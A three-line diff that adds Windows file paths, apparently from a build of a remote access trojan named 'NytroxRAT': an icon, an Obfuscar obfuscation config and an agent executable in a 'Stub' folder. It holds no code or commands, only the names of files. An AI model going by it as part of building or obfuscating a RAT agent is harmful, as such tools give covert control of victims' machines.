@@ -1,0 +1,3 @@
+C:\Users\Umair\Downloads\RemoteAccess\Client\Stub\nytrox.ico
+C:\Users\Umair\Downloads\RemoteAccess\Client\Stub\obfuscar.xml
+C:\Users\Umair\Downloads\RemoteAccess\Client\Stub\NytroxRAT.Agent.exe
